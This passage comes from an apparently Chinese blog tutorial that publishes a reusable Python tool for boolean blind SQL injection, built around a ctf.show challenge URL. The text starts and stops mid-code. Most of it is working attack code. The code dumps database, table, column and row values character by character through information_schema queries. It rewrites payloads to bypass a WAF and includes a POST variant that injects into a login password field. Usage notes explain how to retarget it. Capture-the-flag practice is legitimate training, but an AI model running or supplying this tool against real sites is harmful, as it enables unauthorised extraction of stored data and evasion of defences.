查询数据库表字段的长度</span><br><span class="line">def column_length(User_table_name):     #要查看的表名</span><br><span class="line">    column_len = &#123;&#125;</span><br><span class="line">    for i in range(0,column_num_max):               #i是第几个字段，这里假设有10个字段</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,column_len_max):           #j是要爆破字段的长度，假设字段长度最长为20</span><br><span class="line">            payload = &quot;%20and%20length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;+ hex(int.from_bytes(User_table_name.encode(), &#x27;big&#x27;)) +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                column_len[i] = j</span><br><span class="line">                if i == column_num_max:</span><br><span class="line">                    print(&quot;\033[91m[-]\033[0m 已超过测试字段数的最大值，请调整！！！&quot;)</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return column_len</span><br><span class="line"></span><br><span class="line">### 查询数据库表的名称</span><br><span class="line">def table_name(table_len):</span><br><span class="line">    table_names = &#123;&#125;</span><br><span class="line">    table_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(table_len)):       #i是第几张表，len(table_len)表示共有几张表</span><br><span class="line">        for j in range(1,table_len[i]+1):   #j是要爆破表名第几个字符，到表的长度</span><br><span class="line">            for n in asciis:          #n是要爆破表名的ascii码值</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    table_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n第&#123;i&#125;张表的名称为：&#123;table_one_name&#125;&quot;)</span><br><span class="line">        table_names[i] = table_one_name</span><br><span class="line">        table_one_name = &#x27;&#x27;</span><br><span class="line">    return table_names</span><br><span class="line"></span><br><span class="line">### 查询数据库表的长度</span><br><span class="line">def table_length():</span><br><span class="line">    table_len = &#123;&#125;</span><br><span class="line">    for i in range(0,table_num_max):</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,table_len_max):</span><br><span class="line">            payload = &quot;%20and%20length((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                table_len[i] = j</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return table_len</span><br><span class="line"></span><br><span class="line">### 查询数据库的名称</span><br><span class="line">def database_name(database_len):</span><br><span class="line">    database_names = &#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        for i in range(1,database_len + 1):     #i是数据库的第几个字符</span><br><span class="line">            for j in asciis:                    #j是要爆破数据库名的ascii码值</span><br><span class="line">                payload = &quot;%20and%20ascii(substr(database(),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    database_names += j</span><br><span class="line">                    break</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\n\033[91m[-]\033[0m 查询失败，请检查\033[91mResponse_judgment函数、URL、payload、增加爆破的数据库名长度！！！\033[0m&quot;)</span><br><span class="line">    return database_names</span><br><span class="line"></span><br><span class="line">### 查询数据库的长度</span><br><span class="line">def database_length():</span><br><span class="line">    try:</span><br><span class="line">        for i in range(1,database_len_max):</span><br><span class="line">            payload = &quot;%20and%20length(database())=&quot; + str(i)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                return i</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[91m[-]\033[0m 查询失败，请检查\033[91mResponse_judgment函数、URL、payload、增加爆破的数据库名长度！！！\033[0m&quot;)</span><br><span class="line">        kill()</span><br></pre></td></tr></table></figure><h2 id="4、响应包的布尔判断"><a href="#4、响应包的布尔判断" class="headerlink" title="4、响应包的布尔判断"></a>4、响应包的布尔判断</h2><p>针对GET 和POST 不同类型的SQL注入，有不同的请求方式，同时也可以做到header 的头部注入，在相应包判断中，也就是布尔不同响应的判断。这里根据不用题目的注入点需要进行调整，可以是响应的页面长度，或者响应码等判断。</p><p>如果想查看payload 是否正确进行，可以在这个方法中调试；在请求中添加cookie 等</p><p><strong>注意：</strong></p><p>一个完整的SQL注入语句分为三部分：正常的url 和payload 和 最后的注释符。</p><p>在对payload 进行调整之后，需要手动在请求的时候加上最后的注释符，如 –+、# </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def Response_judgment(payload):</span><br><span class="line">    global url</span><br><span class="line">    # （1）是否进行url 过滤</span><br><span class="line">    payload = Bypass_WAF(payload)</span><br><span class="line">    new_url = url + payload</span><br><span class="line">    # print(new_url)</span><br><span class="line"></span><br><span class="line">    # （2）发送带cookie的和注释的GET请求示例</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    cookies = &#123;</span><br><span class="line">        &#x27;level&#x27; : &#x27;1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    respone = requests.get(new_url+&#x27;--+&#x27;, cookies=cookies)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    response = requests.get(new_url + &#x27;--+&#x27;)</span><br><span class="line"></span><br><span class="line">    # （2）发送带cookie和data和注释的POST请求示例</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload = &quot;admin&#x27;&quot; + payload + &quot;/**/and/**/1=1&quot;</span><br><span class="line">    #print(payload)</span><br><span class="line">    new_url = url</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;username&#x27;  :   &#x27;admin&#x27;,</span><br><span class="line">        &#x27;password&#x27;  :   payload</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url = new_url, data = data)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    # （3）相应包判断</span><br><span class="line">    if &quot;If&quot; in response.text:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure><h2 id="5、Bypass-WAF"><a href="#5、Bypass-WAF" class="headerlink" title="5、Bypass_WAF"></a>5、Bypass_WAF</h2><p>这里也就是用来绕过WAF 的方法，针对基本的注入语句进行调整，可以使用正则对payload 进行调整替换，绕过WAF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">### 绕过过滤</span><br><span class="line">def Bypass_WAF(payload):</span><br><span class="line">    # or 代替 and</span><br><span class="line">    #payload = re.sub(r&#x27;and&#x27;,&#x27;or&#x27;, payload)</span><br><span class="line"></span><br><span class="line">    # 大小写</span><br><span class="line">    #payload = re.sub(r&#x27;where&#x27;,&#x27;WHerE&#x27;, payload)</span><br><span class="line"></span><br><span class="line">    # 空格替换</span><br><span class="line">    payload = re.sub(r&#x27;%20&#x27;,&#x27;/**/&#x27;,payload)</span><br><span class="line">    payload = re.sub(r&#x27; &#x27;,&#x27;/**/&#x27;,payload)</span><br><span class="line"></span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><h1 id="四、脚本内容"><a href="#四、脚本内容" class="headerlink" title="四、脚本内容"></a>四、脚本内容</h1><p><strong>使用注意点：</strong></p><ol><li>全局的url 需要改变，是SQL注入的地址（记得给注入闭合符，如：<a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a>“ ）</li><li>修改爆破过程中使用的推测参数（如果payload没问题，但脚本依然提示错误，可以适量增加爆破参数）</li><li>响应包判断（需要修改，不同的请求，响应包肯定是不同的，可以调试payload）</li><li>可以在Bypass_WAF方法中对基本的payload 进行替换修改，绕过WAF</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import threading</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">### 以下是初始环境变量</span><br><span class="line">url = &#x27;http://ebc6d8a1-5b14-49bf-876f-6ad3e86db03d.challenge.ctf.show/index.php?id=1&#x27;</span><br><span class="line"></span><br><span class="line">### 爆破过程中使用的推测参数</span><br><span class="line">database_len_max = 20   #推测数据库名称的最大长度</span><br><span class="line">table_num_max = 10      #推测该数据库中最大表的数量</span><br><span class="line">table_len_max = 20      #推测数据库表名称的最大长度</span><br><span class="line">column_num_max = 20     #推测该数据库表中字段的最大数量</span><br><span class="line">column_len_max = 20     #推测数据库表字段名称的最大长度</span><br><span class="line">data_num_max = 10       #推测该数据库表字段数值中最大的数量</span><br><span class="line">data_len_max = 50     #推测数据库表字段数值的最大长度(33可查md5)</span><br><span class="line"></span><br><span class="line">### 进度条设置</span><br><span class="line">jindu_left = 0</span><br><span class="line">threading_status = False    #副线程不执行</span><br><span class="line">threading_stop = False      #副线程停止参数</span><br><span class="line">asciis = string.printable   #string.printable表示所有可打印的ascii字符</span><br><span class="line"></span><br><span class="line">### 请求发送，响应判断</span><br><span class="line">def Response_judgment(payload):</span><br><span class="line">    global url</span><br><span class="line">    # （1）是否进行url 过滤</span><br><span class="line">    payload = Bypass_WAF(payload)</span><br><span class="line">    new_url = url + payload</span><br><span class="line">    #print(new_url)</span><br><span class="line"></span><br><span class="line">    # （2）发送带cookie的和注释的GET请求示例</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    cookies = &#123;</span><br><span class="line">        &#x27;level&#x27; : &#x27;1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    respone = requests.get(new_url+&#x27;--+&#x27;, cookies=cookies)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    response = requests.get(new_url + &#x27;/**/and/**/1=1&#x27;)</span><br><span class="line"></span><br><span class="line">    # （2）发送带cookie和data和注释的POST请求示例</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload = &quot;admin&#x27;&quot; + payload + &quot;/**/and/**/1=1&quot;</span><br><span class="line">    #print(payload)</span><br><span class="line">    new_url = url</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;username&#x27;  :   &#x27;admin&#x27;,</span><br><span class="line">        &#x27;password&#x27;  :   payload</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url = new_url, data = data)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    # （3）响应包判断</span><br><span class="line">    if &quot;If&quot; in response.text:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">### 绕过过滤</span><br><span class="line">def Bypass_WAF(payload):</span><br><span class="line">    # 代替 and</span><br><span class="line">    #payload = re.sub(r&#x27;and&#x27;,&#x27;or&#x27;, payload)</span><br><span class="line"></span><br><span class="line">    # 大小写</span><br><span class="line">    #payload = re.sub(r&#x27;where&#x27;,&#x27;WHerE&#x27;, payload)</span><br><span class="line"></span><br><span class="line">    # 空格替换</span><br><span class="line">    payload = re.sub(r&#x27;%20&#x27;,&#x27;/**/&#x27;,payload)</span><br><span class="line">    payload = re.sub(r&#x27; &#x27;,&#x27;/**/&#x27;,payload)</span><br><span class="line"></span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">### 查询数据库表字段的数值</span><br><span class="line">def column_data_name(column_data_len,User_table_name,User_column_name):</span><br><span class="line">    column_data_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_data_len)):         #i是第几个字段的值</span><br><span class="line">        for j in range(1,column_data_len[i]+1):     #j是要爆破字段值的第几个字符</span><br><span class="line">            for n in asciis:                        #asciis是要爆破字段值的ascii码值</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select &quot; + User_column_name + &quot; from &quot; + User_table_name + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    column_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n&#123;User_column_name&#125;字段的第&#123;i&#125;个值为：&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_data_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_data_names</span><br><span class="line"></span><br><span class="line">### 查询数据库表字段数值的长度</span><br><span class="line">def column_data_length(User_table_name,User_column_name):</span><br><span class="line">    column_data_len = &#123;&#125;</span><br><span class="line">    for i in range(0,data_num_max):           #只查询10个数值</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,data_len_max):       #j是要爆破字段数值的长度，猜测该字段数值最大为32（即md5值，可能需要修改）</span><br><span class="line">            payload = &quot;%20and%20length((select &quot;+ User_column_name +&quot; from &quot;+ User_table_name +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                column_data_len[i] = j</span><br><span class="line">                if i == data_num_max:</span><br><span class="line">                    print(&#x27;已超过测试数值的最大值，请调整！！！&#x27;)</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return column_data_len</span><br><span class="line"></span><br><span class="line">### 查询数据库表字段的名称</span><br><span class="line">def column_name(column_len,User_table_name):</span><br><span class="line">    column_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_len)):          #i是第几个字段，len(column_len) 是字段的数量</span><br><span class="line">        for j in range(1,column_len[i]+1):      #j是要爆破字段的第几个字符</span><br><span class="line">            for n in asciis:              #n是要爆破字段名的ascii码值</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot; + hex(int.from_bytes(User_table_name.encode(),&#x27;big&#x27;)) + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    column_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n&#123;User_table_name&#125;表的第&#123;i&#125;个字段的名称为：&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_names</span><br><span class="line"></span><br><span class="line">### 查询数据库表字段的长度</span><br><span class="line">def column_length(User_table_name):     #要查看的表名</span><br><span class="line">    column_len = &#123;&#125;</span><br><span class="line">    for i in range(0,column_num_max):               #i是第几个字段，这里假设有10个字段</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,column_len_max):           #j是要爆破字段的长度，假设字段长度最长为20</span><br><span class="line">            payload = &quot;%20and%20length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;+ hex(int.from_bytes(User_table_name.encode(), &#x27;big&#x27;)) +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                column_len[i] = j</span><br><span class="line">                if i == column_num_max:</span><br><span class="line">                    print(&quot;\033[91m[-]\033[0m 已超过测试字段数的最大值，请调整！！！&quot;)</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return column_len</span><br><span class="line"></span><br><span class="line">### 查询数据库表的名称</span><br><span class="line">def table_name(table_len):</span><br><span class="line">    table_names = &#123;&#125;</span><br><span class="line">    table_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(table_len)):       #i是第几张表，len(table_len)表示共有几张表</span><br><span class="line">        for j in range(1,table_len[i]+1):   #j是要爆破表名第几个字符，到表的长度</span><br><span class="line">            for n in asciis:          #n是要爆破表名的ascii码值</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    table_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n第&#123;i&#125;张表的名称为：&#123;table_one_name&#125;&quot;)</span><br><span class="line">        table_names[i] = table_one_name</span><br><span class="line">        table_one_name = &#x27;&#x27;</span><br><span class="line">    return table_names</span><br><span class="line"></span><br><span class="line">### 查询数据库表的长度</span><br><span class="line">def table_length():</span><br><span class="line">    table_len = &#123;&#125;</span><br><span class="line">    for i in range(0,table_num_max):</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,table_len_max):</span><br><span class="line">            payload = &quot;%20and%20length((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                table_len[i] = j</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return table_len</span><br><span class="line"></span><br><span class="line">### 查询数据库的名称</span><br><span class="line">def database_name(database_len):</span><br><span class="line">    database_names = &#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        for i in range(1,database_len + 1):     #i是数据库的第几个字符</span><br><span class="line">            for j in asciis:                    #j是要爆破数据库名的ascii码值</span><br><span class="line">                payload = &quot;%20and%20ascii(substr(database(),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    database_names += j</span><br><span class="line">                    break</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\n\033[91m[-]\033[0m 查询失败，请检查\033[91mResponse_judgment函数、URL、payload、增加爆破的数据库名长度！！！\033[0m&quot;)</span><br><span class="line">    return database_names</span><br><span class="line"></span><br><span class="line">### 查询数据库的长度</span><br><span class="line">def database_length():</span><br><span class="line">    try:</span><br><span class="line">        for i in range(1,database_len_max):</span><br><span class="line">            payload = &quot;%20and%20length(database())=&quot; + str(i)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                return i</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[91m[-]\033[0m 查询失败，请检查\033[91mResponse_judgment函数、URL、payload、增加爆破的数据库名长度！！！\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line"></span><br><span class="line">def Progress_bar():</span><br><span class="line">    # 初始化参数</span><br><span class="line">    global threading_status</span><br><span class="line">    global jindu_left</span><br><span class="line"></span><br><span class="line">    while not threading_stop:</span><br><span class="line">        while threading_status:</span><br><span class="line">            progress_bar = &quot;\033[94m[*]\033[0m 查询中：\033[92m[\033[0m&#123;0&#125;\033[92m]\033[0m&quot;.format(&quot; &quot; * jindu_left + &quot;\033[92m*\033[0m&quot; + &quot; &quot; * (50 - jindu_left))</span><br><span class="line"></span><br><span class="line">            # 清除之前的进度指示器输出</span><br><span class="line">            sys.stdout.write(&quot;\r&quot; + progress_bar)</span><br><span class="line"></span><br><span class="line">            # 刷新输出，确保进度指示器立即更新</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">            jindu_left = 0 if jindu_left == 50 else jindu_left + 1</span><br><span class="line"></span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">def kill():</span><br><span class="line">    global threading_status</span><br><span class="line">    global threading_stop</span><br><span class="line"></span><br><span class="line">    print(&quot;\033[91m[-]\033[0m 正在退出，请等待！！！&quot;)</span><br><span class="line">    threading_status = False</span><br><span class="line">    threading_stop = True</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;Bye！程序已退出！！！&quot;)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">### 主程序</span><br><span class="line">def main():</span><br><span class="line">    print(f&#x27;--------- &#123;__file__&#125; 开始运行 ---------------&#x27;)</span><br><span class="line">    # （1）初始化环境和参数变量</span><br><span class="line">    global threading_status</span><br><span class="line">    print(&#x27;\033[94m[*]\033[0m 注意：该脚本使用的前提是知道注入点存在的URL、页面回显属于布尔类型、过滤的方法、以及cookie相关&#x27;)</span><br><span class="line">    print(&#x27;\033[94m[*]\033[0m 注意：在使用前请\033[91m修改url 和 Response_judgment 函数\033[0m&#x27;)</span><br><span class="line">    # 创建一个副线程对象</span><br><span class="line">    sub_thread = threading.Thread(target=Progress_bar)</span><br><span class="line">    sub_thread.start()      # 启动副线程</span><br><span class="line"></span><br><span class="line">    # （2）开始查询数据库</span><br><span class="line">    print(&#x27;\033[93m---------------------------- 数据库名查询中 ------------------------------\033[0m&#x27;)</span><br><span class="line">    threading_status = True     #开启副线程</span><br><span class="line">    database_names = database_name(database_length())   #这里传入数据库的长度</span><br><span class="line">    threading_status = False    #关闭副线程</span><br><span class="line">    if not database_names:</span><br><span class="line">        print(&quot;\033[91m[-]\033[0m 查询失败，请调整\033[91mdatabase_length函数中对数值爆破的长度值，或检查使用的payload\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line">    print(f&quot;\n\033[92m[+]\033[0m 当前\033[96m数据库名\033[0m为：\033[94m&#123;database_names&#125;\033[0m&quot;)</span><br><span class="line">    # （3）开始查询数据库表</span><br><span class="line">    print(&#x27;\033[93m---------------------------- 数据库表查询中 ------------------------------\033[0m&#x27;)</span><br><span class="line">    threading_status = True     # 启动副线程</span><br><span class="line">    table_names = table_name(table_length())            #求表的名称，传入表的长度</span><br><span class="line">    threading_status = False    #关闭副线程</span><br><span class="line">    if len(table_names) == 0:</span><br><span class="line">        print(&quot;\n\033[91m[-]\033[0m 查询失败，请调整\033[91mtable_length函数中对数值爆破的长度值，或检查使用的payload\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line">    while True:                 #这里做无限循环，以方便循环查询所有的表</span><br><span class="line">        print(&#x27;\n\033[93m---------------------------- 选择查询的库表 ------------------------------\033[0m&#x27;)</span><br><span class="line">        print(f&quot;\033[92m[+]\033[0m &#123;database_names&#125;所有\033[96m表名\033[0m为：\033[94m&#123;table_names&#125;\033[0m&quot;)</span><br><span class="line">        User_table_name = input(&#x27;请输入要查看的表名（exit退出）：&#x27;)</span><br><span class="line">        if User_table_name == &#x27;exit&#x27;:</span><br><span class="line">            break</span><br><span class="line">        # （4）开始查询数据库表字段</span><br><span class="line">        